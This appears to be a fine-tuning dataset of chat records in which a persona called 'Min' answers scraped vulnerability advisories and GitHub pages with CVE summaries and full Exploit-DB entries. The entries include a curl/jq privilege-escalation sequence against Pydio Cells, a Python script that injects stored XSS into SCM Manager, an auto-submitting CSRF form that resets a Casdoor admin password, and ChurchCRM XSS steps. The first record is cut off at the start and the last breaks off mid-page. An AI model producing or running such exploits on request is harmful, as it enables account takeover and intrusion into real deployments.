v4.5.4 is vulnerable to Reflected Cross-Site Scripting (XSS) via image file.\n\nexploit\n/php/webapps/51477.txt\n# Exploit Title: ChurchCRM v4.5.4 - Reflected XSS via Image (Authenticated)\n# Date: 2023-04-17\n# Exploit Author: Rahad Chowdhury\n# Vendor Homepage: http://churchcrm.io/\n# Software Link: https://github.com/ChurchCRM/CRM/releases/tag/4.5.4\n# Version: 4.5.4\n# Tested on: Windows 10, PHP 7.4.29, Apache 2.4.53\n# CVE: CVE-2023-31699\n\nSteps to Reproduce:\n\n1. At first login your admin panel.\n2. Then click the \"Admin\" menu and click \"CSV Import '' and you will get\nthe CSV file uploader option.\n3. now insert xss payload in jpg file using exiftool or from image\nproperties and then upload the jpg file.\n4. you will see XSS pop up.\n"}]}
{"messages": [{"role": "system", "content": "Min is a fuzzer that gives you the source code and other information that details the inputs that cause it to exploit or to crash."}, {"role": "user", "content": "source code:\nhttp://seclists.org/fulldisclosure/2023/May/18\nFull Disclosure: [RT-SA-2023-003] Pydio Cells: Unauthorised Role Assignments\n\nNmap.org\nNpcap.com\nSeclists.org\nSectools.org\nInsecure.org\nFull Disclosure\nmailing list archives\n\nBy Date\nBy Thread\n[RT-SA-2023-003] Pydio Cells: Unauthorised Role Assignments\n\nFrom: RedTeam Pentesting GmbH <release () redteam-pentesting de>\nDate: Tue, 30 May 2023 11:46:45 +0200\n\nAdvisory: Pydio Cells: Unauthorised Role Assignments\n\nPydio Cells allows users by default to create so-called external users\nin order to share files with them. By modifying the HTTP request sent\nwhen creating such an external user, it is possible to assign the new\nuser arbitrary roles. By assigning all roles to a newly created user, access to\nall cells and non-personal workspaces is granted.\nDetails\n=======\n\nProduct: Pydio Cells\nAffected Versions: 4.1.2 and earlier versions\nFixed Versions: 4.2.0, 4.1.3, 3.0.12\nVulnerability Type: Privilege Escalation\nSecurity Risk: high\nVendor URL: https://pydio.com/\nVendor Status: notified\nAdvisory URL: https://www.redteam-pentesting.de/advisories/rt-sa-2023-003\nAdvisory Status: published\nCVE: CVE-2023-32749\nCVE URL: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-32749\nIntroduction\n============\n\n\"Pydio Cells is an open-core, self-hosted Document Sharing and\nCollaboration platform (DSC) specifically designed for organizations\nthat need advanced document sharing and collaboration without security\ntrade-offs or compliance issues.\"\n\n(from the vendor's homepage)\nMore Details\n============\n\nUsers can share cells or folders with other users on the same Pydio\ninstance. The web application allows to either select an already\nexisting user from a list or to create a new user by entering a new\nusername and password, if this functionality is enabled. When creating a\nnew user in this way, a HTTP PUT request like the following is sent:\n\n------------------------------------------------------------------------\nPUT /a/user/newuser HTTP/2\nHost: example.com\nUser-Agent: agent\nAuthorization: Bearer O48gvjD[...]\nContent-Type: application/json\nContent-Length: 628\nCookie: token=AO[...]\n\n{\n  \"Attributes\": {\n    \"profile\": \"shared\",\n    \"parameter:core.conf:lang\": \"\\\"en-us\\\"\",\n    \"send_email\": \"false\"\n  },\n  \"Roles\": [],\n  \"Login\": \"newuser\",\n  \"Password\": \"secret!\",\n  \"GroupPath\": \"/\",\n  \"Policies\": [...]\n}\n------------------------------------------------------------------------\n\nThe JSON object sent in the body contains the username and password\nfor the user to be created and an empty list for the key \"Roles\". The\nresponse contains a JSON object similar to the following:\n\n------------------------------------------------------------------------\n{\n  \"Uuid\": \"58811c4c-2286-4ca0-8e8a-14ab9dbca8ce\",\n  \"GroupPath\": \"/\",\n  \"Attributes\": {\n    \"parameter:core.conf:lang\": \"\\\"en-us\\\"\",\n    \"profile\": \"shared\"\n  },\n  \"Roles\": [\n    {\n      \"Uuid\": \"EXTERNAL_USERS\",\n      \"Label\": \"External Users\",\n      \"Policies\": [...]\n    },\n    {\n      \"Uuid\": \"58811c4c-2286-4ca0-8e8a-14ab9dbca8ce\",\n      \"Label\": \"User newuser\",\n      \"UserRole\": true,\n      \"Policies\": [...]\n    }\n  ],\n  \"Login\": \"newuser\",\n  \"Policies\": [....],\n  \"PoliciesContextEditable\": true\n}\n------------------------------------------------------------------------\n\nThe key \"Roles\" now contains a list with two objects, which seem to be\napplied by default. The roles list in the HTTP request can be\nmodified to contain a list of all available UUIDs for roles, which can\nbe obtained by using the user search functionality. This results in a\nnew user account with all roles applied. By performing a login as the\nnewly created user, access to all cells and non-personal workspaces of\nthe whole Pydio instance is granted.\nProof of Concept\n================\n\nLogin to the Pydio Cells web interface with a regular user and retrieve\nthe JWT from the HTTP requests. This can either be done using an HTTP\nattack proxy or using the browser's developer tools. Subsequently, curl [1]\ncan be used as follows to retrieve a list of all users and their roles:\n\n------------------------------------------------------------------------\n$ export JWT=\"<insert JWT here>\"\n$ curl --silent \\\n--header \"Authorization: Bearer $TOKEN\" \\\n--header 'Content-Type: application/json' \\\n--data '{}' \\\nhttps://example.com/a/user | tee all_users.json\n\n{\"Users\":[...]}\n------------------------------------------------------------------------\n\nAfterwards, jq [2] can be used to create a JSON document which can be\nsent to the Pydio REST-API in order to create the external user \"foobar\"\nwith the password \"hunter2\" and all roles assigned:\n\n------------------------------------------------------------------------\n$ jq '.Users[].Roles' all_users.json \\\n| jq -s 'flatten | .[].Uuid | {Uuid: .}' \\\n| jq -s 'unique' \\\n| jq '{\"Login\": \"foobar\", \"Password\": \"hunter2\", \"Attributes\":\n{\"profile\": \"shared\"}, \"Roles\": .}' \\\n| tee create_user.json\n\n{\n  \"Login\": \"foobar\",\n  \"Password\": \"hunter2\",\n  \"Attributes\": {\n    \"profile\": \"shared\"\n  },\n  \"Roles\": [...]\n}\n------------------------------------------------------------------------\n\nFinally, the following curl command can be issued to create the new external\nuser:\n\n------------------------------------------------------------------------\n$ curl --request PUT \\\n--silent \\\n--header \"Authorization: Bearer $JWT\" \\\n--header 'Content-Type: application/json' \\\n--data @create_user.json \\\nhttps://example.com/a/user/foobar\n------------------------------------------------------------------------\n\nNow, login with the newly created user to access all cells and\nnon-personal workspaces.\n\nWorkaround\n==========\n\nDisallow the creation of external users in the authentication settings.\nFix\n===\n\nUpgrade Pydio Cells to a version without the vulnerability.\nSecurity Risk\n=============\n\nAttackers with access to any regular user account for a Pydio Cells instance can\nextend their privileges by creating a new external user with all roles\nassigned. Subsequently, they can access all folders and files in any\ncell and workspace, except for personal workspaces. The creation of\nexternal users is activated by default. Therefore, the vulnerability is\nestimated to pose a high risk.\nTimeline\n========\n\n2023-03-23 Vulnerability identified\n2023-05-02 Customer approved disclosure to vendor\n2023-05-02 Vendor notified\n2023-05-03 CVE ID requested\n2023-05-08 Vendor released fixed version\n2023-05-14 CVE ID assigned\n2023-05-16 Vendor asks for a few more days before the advisory is released\n2023-05-30 Advisory released\nReferences\n==========\n\n[1] https://curl.se/\n[2] https://stedolan.github.io/jq/\nRedTeam Pentesting GmbH\n=======================\n\nRedTeam Pentesting offers individual penetration tests performed by a\nteam of specialised IT-security experts. Hereby, security weaknesses in\ncompany networks or products are uncovered and can be fixed immediately.\n\nAs there are only few experts in this field, RedTeam Pentesting wants to\nshare its knowledge and enhance the public knowledge with research in\nsecurity-related areas. The results are made available as public\nsecurity advisories.\n\nMore information about RedTeam Pentesting can be found at:\nhttps://www.redteam-pentesting.de/\nWorking at RedTeam Pentesting\n=============================\n\nRedTeam Pentesting is looking for penetration testers to join our team\nin Aachen, Germany. If you are interested please visit:\nhttps://jobs.redteam-pentesting.de/\n\n-- \nRedTeam Pentesting GmbH                   Tel.: +49 241 510081-0\nAlter Posthof 1                           Fax : +49 241 510081-99\n52062 Aachen                    https://www.redteam-pentesting.de\nGermany                         Registergericht: Aachen HRB 14004\nGeschäftsführer:                       Patrick Hof, Jens Liebchen\nAttachment:\nsignature.asc\nDescription: \n_______________________________________________\nSent through the Full Disclosure mailing list\nhttps://nmap.org/mailman/listinfo/fulldisclosure\nWeb Archives & RSS: https://seclists.org/fulldisclosure/\n\nBy Date\nBy Thread\n\nCurrent thread:\n\n[RT-SA-2023-003] Pydio Cells: Unauthorised Role Assignments RedTeam Pentesting GmbH (May 30)\nNmap Security Scanner\n\nRef Guide\nInstall Guide\nDocs\nDownload\nNmap OEM\n\nNpcap packet capture\n\nUser's Guide\nAPI docs\nDownload\nNpcap OEM\n\nSecurity Lists\n\nNmap Announce\nNmap Dev\nFull Disclosure\nOpen Source Security\nBreachExchange\n\nSecurity Tools\n\nVuln scanners\nPassword audit\nWeb scanners\nWireless\nExploitation\n\nAbout\n\nAbout/Contact\nPrivacy\nAdvertising\nNmap Public Source License\n\n\n"}, {"role": "assistant", "content": "descriptionsPydio Cells allows users by default to create so-called external users in order to share files with them. By modifying the HTTP request sent when creating such an external user, it is possible to assign the new user arbitrary roles. By assigning all roles to a newly created user, access to all cells and non-personal workspaces is granted.\n\nexploit\n/go/webapps/51496.txt\nExploit Title: Pydio Cells 4.1.2 - Unauthorised Role Assignments\nAffected Versions: 4.1.2 and earlier versions\nFixed Versions: 4.2.0, 4.1.3, 3.0.12\nVulnerability Type: Privilege Escalation\nSecurity Risk: high\nVendor URL: https://pydio.com/\nVendor Status: notified\nAdvisory URL: https://www.redteam-pentesting.de/advisories/rt-sa-2023-003\nAdvisory Status: published\nCVE: CVE-2023-32749\nCVE URL: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-32749\n\n\nIntroduction\n============\n\n\"Pydio Cells is an open-core, self-hosted Document Sharing and\nCollaboration platform (DSC) specifically designed for organizations\nthat need advanced document sharing and collaboration without security\ntrade-offs or compliance issues.\"\n\n(from the vendor's homepage)\n\n\nMore Details\n============\n\nUsers can share cells or folders with other users on the same Pydio\ninstance. The web application allows to either select an already\nexisting user from a list or to create a new user by entering a new\nusername and password, if this functionality is enabled. When creating a\nnew user in this way, a HTTP PUT request like the following is sent:\n\n------------------------------------------------------------------------\nPUT /a/user/newuser HTTP/2\nHost: example.com\nUser-Agent: agent\nAuthorization: Bearer O48gvjD[...]\nContent-Type: application/json\nContent-Length: 628\nCookie: token=AO[...]\n\n{\n  \"Attributes\": {\n    \"profile\": \"shared\",\n    \"parameter:core.conf:lang\": \"\\\"en-us\\\"\",\n    \"send_email\": \"false\"\n  },\n  \"Roles\": [],\n  \"Login\": \"newuser\",\n  \"Password\": \"secret!\",\n  \"GroupPath\": \"/\",\n  \"Policies\": [...]\n}\n------------------------------------------------------------------------\n\nThe JSON object sent in the body contains the username and password\nfor the user to be created and an empty list for the key \"Roles\". The\nresponse contains a JSON object similar to the following:\n\n------------------------------------------------------------------------\n{\n  \"Uuid\": \"58811c4c-2286-4ca0-8e8a-14ab9dbca8ce\",\n  \"GroupPath\": \"/\",\n  \"Attributes\": {\n    \"parameter:core.conf:lang\": \"\\\"en-us\\\"\",\n    \"profile\": \"shared\"\n  },\n  \"Roles\": [\n    {\n      \"Uuid\": \"EXTERNAL_USERS\",\n      \"Label\": \"External Users\",\n      \"Policies\": [...]\n    },\n    {\n      \"Uuid\": \"58811c4c-2286-4ca0-8e8a-14ab9dbca8ce\",\n      \"Label\": \"User newuser\",\n      \"UserRole\": true,\n      \"Policies\": [...]\n    }\n  ],\n  \"Login\": \"newuser\",\n  \"Policies\": [....],\n  \"PoliciesContextEditable\": true\n}\n------------------------------------------------------------------------\n\nThe key \"Roles\" now contains a list with two objects, which seem to be\napplied by default. The roles list in the HTTP request can be\nmodified to contain a list of all available UUIDs for roles, which can\nbe obtained by using the user search functionality. This results in a\nnew user account with all roles applied. By performing a login as the\nnewly created user, access to all cells and non-personal workspaces of\nthe whole Pydio instance is granted.\n\n\nProof of Concept\n================\n\nLogin to the Pydio Cells web interface with a regular user and retrieve\nthe JWT from the HTTP requests. This can either be done using an HTTP\nattack proxy or using the browser's developer tools. Subsequently, curl [1]\ncan be used as follows to retrieve a list of all users and their roles:\n\n------------------------------------------------------------------------\n$ export JWT=\"<insert JWT here>\"\n$ curl --silent \\\n--header \"Authorization: Bearer $TOKEN\" \\\n--header 'Content-Type: application/json' \\\n--data '{}' \\\nhttps://example.com/a/user | tee all_users.json\n\n{\"Users\":[...]}\n------------------------------------------------------------------------\n\nAfterwards, jq [2] can be used to create a JSON document which can be\nsent to the Pydio REST-API in order to create the external user \"foobar\"\nwith the password \"hunter2\" and all roles assigned:\n\n------------------------------------------------------------------------\n$ jq '.Users[].Roles' all_users.json \\\n| jq -s 'flatten | .[].Uuid | {Uuid: .}' \\\n| jq -s 'unique' \\\n| jq '{\"Login\": \"foobar\", \"Password\": \"hunter2\", \"Attributes\":\n{\"profile\": \"shared\"}, \"Roles\": .}' \\\n| tee create_user.json\n\n{\n  \"Login\": \"foobar\",\n  \"Password\": \"hunter2\",\n  \"Attributes\": {\n    \"profile\": \"shared\"\n  },\n  \"Roles\": [...]\n}\n------------------------------------------------------------------------\n\nFinally, the following curl command can be issued to create the new external\nuser:\n\n------------------------------------------------------------------------\n$ curl --request PUT \\\n--silent \\\n--header \"Authorization: Bearer $JWT\" \\\n--header 'Content-Type: application/json' \\\n--data @create_user.json \\\nhttps://example.com/a/user/foobar\n------------------------------------------------------------------------\n\nNow, login with the newly created user to access all cells and\nnon-personal workspaces.\n\nWorkaround\n==========\n\nDisallow the creation of external users in the authentication settings.\n\n\nFix\n===\n\nUpgrade Pydio Cells to a version without the vulnerability.\n\n\nSecurity Risk\n=============\n\nAttackers with access to any regular user account for a Pydio Cells instance can\nextend their privileges by creating a new external user with all roles\nassigned. Subsequently, they can access all folders and files in any\ncell and workspace, except for personal workspaces. The creation of\nexternal users is activated by default. Therefore, the vulnerability is\nestimated to pose a high risk.\n\n\nTimeline\n========\n\n2023-03-23 Vulnerability identified\n2023-05-02 Customer approved disclosure to vendor\n2023-05-02 Vendor notified\n2023-05-03 CVE ID requested\n2023-05-08 Vendor released fixed version\n2023-05-14 CVE ID assigned\n2023-05-16 Vendor asks for a few more days before the advisory is released\n2023-05-30 Advisory released\n\n\nReferences\n==========\n\n[1] https://curl.se/\n[2] https://stedolan.github.io/jq/\n\n\nRedTeam Pentesting GmbH\n=======================\n\nRedTeam Pentesting offers individual penetration tests performed by a\nteam of specialised IT-security experts. Hereby, security weaknesses in\ncompany networks or products are uncovered and can be fixed immediately.\n\nAs there are only few experts in this field, RedTeam Pentesting wants to\nshare its knowledge and enhance the public knowledge with research in\nsecurity-related areas. The results are made available as public\nsecurity advisories.\n\nMore information about RedTeam Pentesting can be found at:\nhttps://www.redteam-pentesting.de/\n\n\nWorking at RedTeam Pentesting\n=============================\n\nRedTeam Pentesting is looking for penetration testers to join our team\nin Aachen, Germany. If you are interested please visit:\nhttps://jobs.redteam-pentesting.de/\n"}]}
{"messages": [{"role": "system", "content": "Min is a fuzzer that gives you the source code and other information that details the inputs that cause it to exploit or to crash."}, {"role": "user", "content": "source code:\nhttps://github.com/n3gox/Stored-XSS-on-SCM-Manager-1.60\n\nGitHub - n3gox/CVE-2023-33829: Proof of Concept about a XSS Stored in SCM Manager 1.2 <= 1.60\n\nSkip to content\nNavigation Menu\n\nToggle navigation\n          Sign in\n        \n \n\n        Product\n        \nActions\n        Automate any workflow\n      \n\nPackages\n        Host and manage packages\n      \n\nSecurity\n        Find and fix vulnerabilities\n      \n\nCodespaces\n        Instant dev environments\n      \n\nGitHub Copilot\n        Write better code with AI\n      \n\nCode review\n        Manage code changes\n      \n\nIssues\n        Plan and track work\n      \n\nDiscussions\n        Collaborate outside of code\n      \nExplore\n\n      All features\n\n    \n\n      Documentation\n\n    \n\n      GitHub Skills\n\n    \n\n      Blog\n\n    \n\n        Solutions\n        \n\nFor\n\n      Enterprise\n\n    \n\n      Teams\n\n    \n\n      Startups\n\n    \n\n      Education\n\n    \nBy Solution\n\n      CI/CD & Automation\n\n    \n\n      DevOps\n\n    \n\n      DevSecOps\n\n    \nResources\n\n      Learning Pathways\n\n    \n\n      White papers, Ebooks, Webinars\n\n    \n\n      Customer Stories\n\n    \n\n      Partners\n\n    \n\n        Open Source\n        \n\nGitHub Sponsors\n        Fund open source developers\n      \nThe ReadME Project\n        GitHub community articles\n      \nRepositories\n\n      Topics\n\n    \n\n      Trending\n\n    \n\n      Collections\n\n    \n\n        Enterprise\n        \nEnterprise platform\n        AI-powered developer platform\n      \nAvailable add-ons\n\nAdvanced Security\n        Enterprise-grade security features\n      \n\nGitHub Copilot\n        Enterprise-grade AI features\n      \n\nPremium Support\n        Enterprise-grade 24/7 support\n      \nPricing\nSearch or jump to...\n\nSearch code, repositories, users, issues, pull requests...\n\n \n        Search\n      \n\nClear\n \n\n \n              Search syntax tips\n \n        Provide feedback\n      \n\n \nWe read every piece of feedback, and take your input very seriously.\nInclude my email address so I can be contacted\n     Cancel\n\n    Submit feedback\n        Saved searches\n      \nUse saved searches to filter your results more quickly\n\n \n\nName\nQuery\n\n            To see all available qualifiers, see our documentation.\n          \n \n\n     Cancel\n\n    Create saved search\n              Sign in\n            \n              Sign up\n            \n\nYou signed in with another tab or window. Reload to refresh your session.\nYou signed out in another tab or window. Reload to refresh your session.\nYou switched accounts on another tab or window. Reload to refresh your session.\n \nDismiss alert\n\n        n3gox\n \n/\n\nCVE-2023-33829\n\nPublic\n\n \n\nNotifications\n You must be signed in to change notification settings\n \n\nFork\n    0\n \n          Star\n 0\n  \n        Proof of Concept about a XSS Stored in SCM Manager 1.2 <= 1.60\n      \n\n0\n          stars\n \n\n0\n          forks\n \n\nBranches\n \n\nTags\n \n\nActivity\n \n\n \n          Star\n\n  \n\n \n\nNotifications\n You must be signed in to change notification settings\n\nCode\n\nIssues\n0\nPull requests\n0\nActions\n\nProjects\n0\nSecurity\n\nInsights\n\n \n\n \nAdditional navigation options\n \n          Code\n          Issues\n          Pull requests\n          Actions\n          Projects\n          Security\n          Insights\n\n \n\nn3gox/CVE-2023-33829\n\nThis commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.\n\n \n\n    mainBranchesTagsGo to fileCodeFolders and filesNameNameLast commit messageLast commit dateLatest commit History16 CommitsCVE-2023-33829.pyCVE-2023-33829.py  README.mdREADME.md  requirements.txtrequirements.txt  View all filesRepository files navigationREADMECVE-2023-33829: Stored-XSS-on-SCM-Manager-1.60\nSummary\nA vulnerability is discovered in the SCM Manager 1.2 <= 1.60 version that allows an attackers previously authenticated with write permissions execute javascript code in specific fields.\nThis Proof of Concept is maded in a local environment deploying a SCM Manager 1.60 using docker\nCVE published:\n\nhttps://www.incibe.es/incibe-cert/alerta-temprana/vulnerabilidades/cve-2023-33829\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-33829\nhttps://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-33829\nhttps://www.exploit-db.com/exploits/51488\n\nRequirements\n1 - Git clone the repository\n2 - Make sure that you are into the repository\n3 - pip3 install -r requirements.txt\n4 - python3 CVE-2023-33829.py -h\n\nInstalling SCM Manager 1.60\nCopy and paste this bash script in a script.sh file, bring execution permissions and execute the file:\n#!/bin/bash\n\nmkdir /var/lib/scm\nchown 1000:1000 /var/lib/scm\ndocker run -v /var/lib/scm:/var/lib/scm -p 8080:8080 sdorra/scm-manager\nThe script is created by sdorra, here is the oficial link:\nhttps://bitbucket.org/sdorra/docker-scm-manager/src/master/\nNOTE: You need to have installed docker previously.\nOnce you have installed the SCM Manager 1.60, it will request you a username and a password:\nUsername : scmadmin\nPassword: scmadmin\nProof of Concept:\n\n2- Create a new repository with whatever type but in the Description field is the vulnerable, so let's inject the payload and it will be triggered:\n\n3- Create a new user and the specific vulnerable field is Display Name, so inject the payload introduced before:\n4- Create a new group and the specific vulnerable field is Description, so inject our payload:\n\nPAYLOAD USED: <img src=x onerror=alert(1)>\nFIX\nNew Versions of the SCM Manager are fixed.\n   \nAbout\n\n        Proof of Concept about a XSS Stored in SCM Manager 1.2 <= 1.60\n      \nTopics\n\n  hacking\n  python3\n  cybersecurity\n  cve\n\nResources\n\n        Readme\n \n\nActivity\n \nStars\n\n0\n      stars\n \nWatchers\n\n1\n      watching\n \nForks\n\n0\n      forks\n \n          Report repository\n \n\n    Releases\n\nNo releases published\n    Packages\n      0\n        No packages published \n\nLanguages\nPython\n100.0%\n\nFooter\n        © 2024 GitHub, Inc.\n      \nFooter navigation\nTerms\nPrivacy\nSecurity\nStatus\nDocs\nContact\n      Manage cookies\n    \n\n      Do not share my personal information\n    \n    You can’t perform that action at this time.\n  \n\n"}, {"role": "assistant", "content": "descriptionsA stored cross-site scripting (XSS) vulnerability in Cloudogu GmbH SCM Manager v1.2 to v1.60 allows attackers to execute arbitrary web scripts or HTML via a crafted payload injected into the Description text field.\n\nexploit\n/multiple/webapps/51488.py\n#!/usr/bin/python3\n\n# Exploit Title: SCM Manager 1.60 - Cross-Site Scripting Stored (Authenticated)\n# Google Dork: intitle:\"SCM Manager\" intext:1.60\n# Date: 05-25-2023\n# Exploit Author: neg0x (https://github.com/n3gox/CVE-2023-33829)\n# Vendor Homepage: https://scm-manager.org/\n# Software Link: https://scm-manager.org/docs/1.x/en/getting-started/\n# Version: 1.2 <= 1.60\n# Tested on: Debian based\n# CVE: CVE-2023-33829\n\n# Modules\nimport requests\nimport argparse\nimport sys\n\n# Main menu\nparser = argparse.ArgumentParser(description='CVE-2023-33829 exploit')\nparser.add_argument(\"-u\", \"--user\", help=\"Admin user or user with write permissions\")\nparser.add_argument(\"-p\", \"--password\", help=\"password of the user\")\nargs = parser.parse_args()\n\n\n# Credentials\nuser = sys.argv[2]\npassword = sys.argv[4]\n\n\n# Global Variables\nmain_url = \"http://localhost:8080/scm\" # Change URL if its necessary\nauth_url = main_url + \"/api/rest/authentication/login.json\"\nusers = main_url + \"/api/rest/users.json\"\ngroups = main_url + \"/api/rest/groups.json\"\nrepos = main_url + \"/api/rest/repositories.json\"\n\n# Create a session\nsession = requests.Session()\n\n# Credentials to send\npost_data={\n\t'username': user, # change if you have any other user with write permissions\n\t'password': password # change if you have any other user with write permissions\n}\n\nr = session.post(auth_url, data=post_data)\n\nif r.status_code == 200:\n\tprint(\"[+] Authentication successfully\")\nelse:\n\tprint(\"[-] Failed to authenticate\")\n\tsys.exit(1)\n\nnew_user={\n\n\t\"name\": \"newUser\",\n\t\"displayName\": \"<img src=x onerror=alert('XSS')>\",\n\t\"mail\": \"\",\n\t\"password\": \"\",\n\t\"admin\": False,\n\t\"active\": True,\n\t\"type\": \"xml\"\n\n}\n\ncreate_user = session.post(users, json=new_user)\nprint(\"[+] User with XSS Payload created\")\n\nnew_group={\n\n\t\"name\": \"newGroup\",\n\t\"description\": \"<img src=x onerror=alert('XSS')>\",\n\t\"type\": \"xml\"\n\n}\n\ncreate_group = session.post(groups, json=new_group)\nprint(\"[+] Group with XSS Payload created\")\n\nnew_repo={\n\n\t\"name\": \"newRepo\",\n\t\"type\": \"svn\",\n\t\"contact\": \"\",\n\t\"description\": \"<img src=x onerror=alert('XSS')>\",\n\t\"public\": False\n\n}\n\ncreate_repo = session.post(repos, json=new_repo)\nprint(\"[+] Repository with XSS Payload created\")\n"}]}
{"messages": [{"role": "system", "content": "Min is a fuzzer that gives you the source code and other information that details the inputs that cause it to exploit or to crash."}, {"role": "user", "content": "source code:\nhttps://gist.github.com/omriman067/4e90a3a4ffa40984f011d8777a995469\nCasdoor Vulnerability · GitHub\nSkip to content\n\n \n \nAll gists\nBack to GitHub\n\n      Sign in\n        Sign up\n\n        Sign in\n \n          Sign up\n \n\nYou signed in with another tab or window. Reload to refresh your session.\nYou signed out in another tab or window. Reload to refresh your session.\nYou switched accounts on another tab or window. Reload to refresh your session.\n \nDismiss alert\n\n        Instantly share code, notes, and snippets.\n      \n\nomriman067/Casdoor Vulnerability\n\n                Secret\n \n          Last active\n          June 21, 2023 19:31\n\n \nShow Gist options\n \n\n          Download ZIP\n\n \n \n \n\nStar\n\n(0)\n0\nYou must be signed in to star a gist\n \n\nFork\n\n(0)\n0\nYou must be signed in to fork a gist\n \nEmbed\n\n \n\n           Embed\n \n            Embed this gist in your website.\n          \n\n           Share\n \n            Copy sharable link for this gist.\n          \n\n          Clone via HTTPS\n \n            Clone using the web URL.\n          \n                Learn more about clone URLs\n \n \n\n        Clone this repository at &lt;script src=&quot;https://gist.github.com/omriman067/4e90a3a4ffa40984f011d8777a995469.js&quot;&gt;&lt;/script&gt;\n \n \nSave omriman067/4e90a3a4ffa40984f011d8777a995469 to your computer and use it in GitHub Desktop.\n      Code\n\n        Revisions\n        2\n \nEmbed\n\n \n\n           Embed\n \n            Embed this gist in your website.\n          \n\n           Share\n \n            Copy sharable link for this gist.\n          \n\n          Clone via HTTPS\n \n            Clone using the web URL.\n          \n                Learn more about clone URLs\n \n \n\n        Clone this repository at &lt;script src=&quot;https://gist.github.com/omriman067/4e90a3a4ffa40984f011d8777a995469.js&quot;&gt;&lt;/script&gt;\n \n\n \nSave omriman067/4e90a3a4ffa40984f011d8777a995469 to your computer and use it in GitHub Desktop.\nDownload ZIP\n \nRaw\n\n              Casdoor Vulnerability\n            \nCVE-2023-34927\n\nVulnerable Product Version: All versions of Casdoor up to and including v1.331.0\n\nVulnerability Type: Cross-Site Request Forgery (CWE-352)\n\nDescription: A cross-site request forgery (CSRF) vulnerability exists in all versions of Casdoor up to and including v1.331.0. The application does not have CSRF checks in in the endpoint /api/set-password. This vulnerability allows attackers to arbitrarily change the victim user's password via supplying a crafted URL.\nSign up for free\nto join this conversation on GitHub.\n    Already have an account?\n    Sign in to comment\n\nFooter\n        © 2024 GitHub, Inc.\n      \nFooter navigation\nTerms\nPrivacy\nSecurity\nStatus\nDocs\nContact\n      Manage cookies\n    \n\n      Do not share my personal information\n    \n    You can’t perform that action at this time.\n  \n\n"}, {"role": "assistant", "content": "descriptionsCasdoor v1.331.0 and below was discovered to contain a Cross-Site Request Forgery (CSRF) in the endpoint /api/set-password. This vulnerability allows attackers to arbitrarily change the victim user's password via supplying a crafted URL.\n\nexploit\n/go/webapps/51961.txt\n# Exploit Title: Casdoor < v1.331.0 - '/api/set-password' CSRF\n# Application: Casdoor\n# Version: <= 1.331.0\n# Date: 03/07/2024\n# Exploit Author: Van Lam Nguyen\n# Vendor Homepage: https://casdoor.org/\n# Software Link: https://github.com/casdoor/casdoor\n# Tested on: Windows\n# CVE : CVE-2023-34927\n\nOverview\n==================================================\nCasdoor v1.331.0 and below was discovered to contain a Cross-Site Request Forgery (CSRF) in the endpoint /api/set-password.\nThis vulnerability allows attackers to arbitrarily change the victim user's password via supplying a crafted URL.\n\nProof of Concept\n==================================================\n\nMade an unauthorized request to /api/set-password that bypassed the old password entry authentication step\n\n<html>\n<form action=\"http://localhost:8000/api/set-password\" method=\"POST\">\n    <input name='userOwner' value='built&#45;in' type='hidden'>\n    <input name='userName' value='admin' type='hidden'>\n    <input name='newPassword' value='hacked' type='hidden'>\n    <input type=submit>\n</form>\n<script>\n    history.pushState('', '', '/');\n    document.forms[0].submit();\n</script>\n\n</html>\n\nIf a user is logged into the Casdoor Webapp at time of execution, a new user will be created in the app with the following credentials\n\nuserOwner: built&#45;in\nuserName: admin\nnewPassword: hacked\n"}]}
{"messages": [{"role": "system", "content": "Min is a fuzzer that gives you the source code and other information that details the inputs that cause it to exploit or to crash."}, {"role": "user", "content": "source code:\nhttps://github.com/TraiLeR2?tab=overview&from=2023-05-01&to=2023-05-31\n\nTraiLeR2 (IdanMalihi) · GitHub\nSkip to content\n\nNavigation Menu\n\nToggle navigation\n          Sign in\n        \n \n\n        Product\n        \nActions\n        Automate any workflow\n      \n\nPackages\n        Host and manage packages\n      \n\nSecurity\n        Find and fix vulnerabilities\n      \n\nCodespaces\n        Instant dev environments\n      \n\nGitHub Copilot\n        Write better code with AI\n      \n\nCode review\n        Manage code changes\n      \n\nIssues\n        Plan and track work\n      \n\nDiscussions\n        Collaborate outside of code\n      \nExplore\n\n      All features\n\n    \n\n      Documentation\n\n    \n\n      GitHub Skills\n\n    \n\n      Blog\n\n    \n\n        Solutions\n        \n\nFor\n\n      Enterprise\n\n    \n\n      Teams\n\n    \n\n      Startups\n\n    \n\n      Education\n\n    \nBy Solution\n\n      CI/CD & Automation\n\n    \n\n      DevOps\n\n    \n\n      DevSecOps\n\n    \nResources\n\n      Learning Pathways\n\n    \n\n      White papers, Ebooks, Webinars\n\n    \n\n      Customer Stories\n\n    \n\n      Partners\n\n    \n\n        Open Source\n        \n\nGitHub Sponsors\n        Fund open source developers\n      \nThe ReadME Project\n        GitHub community articles\n      \nRepositories\n\n      Topics\n\n    \n\n      Trending\n\n    \n\n      Collections\n\n    \n\n        Enterprise\n        \nEnterprise platform\n        AI-powered developer platform\n      \nAvailable add-ons\n\nAdvanced Security\n        Enterprise-grade security features\n      \n\nGitHub Copilot\n        Enterprise-grade AI features\n      \n\nPremium Support\n        Enterprise-grade 24/7 support\n      \nPricing\nSearch or jump to...\n\nSearch code, repositories, users, issues, pull requests...\n\n \n        Search\n      \n\nClear\n \n\n \n              Search syntax tips\n \n        Provide feedback\n      \n\n \nWe read every piece of feedback, and take your input very seriously.\nInclude my email address so I can be contacted\n     Cancel\n\n    Submit feedback\n        Saved searches\n      \nUse saved searches to filter your results more quickly\n\n \n\nName\nQuery\n\n            To see all available qualifiers, see our documentation.\n          \n \n\n     Cancel\n\n    Create saved search\n              Sign in\n            \n              Sign up\n            \n\nYou signed in with another tab or window. Reload to refresh your session.\nYou signed out in another tab or window. Reload to refresh your session.\nYou switched accounts on another tab or window. Reload to refresh your session.\n \nDismiss alert\n \n\nTraiLeR2\nFollow\n \n\n    Overview\n\n    Repositories\n    15\n\n    Projects\n    0\n\n      Packages\n      0\n\n    Stars\n    0\n \n\nMore\n \nOverview\nRepositories\nProjects\nPackages\nStars\n\n \n\n \n\nTraiLeR2\n \n\nFollow\n\n          IdanMalihi\n        \n\n          TraiLeR2\n\n        \nFollow\n\n6\n          followers\n        · \n0\n          following\n\n        Block or Report\n      \n\nBlock or report TraiLeR2\nBlock user\n\n            Prevent this user from 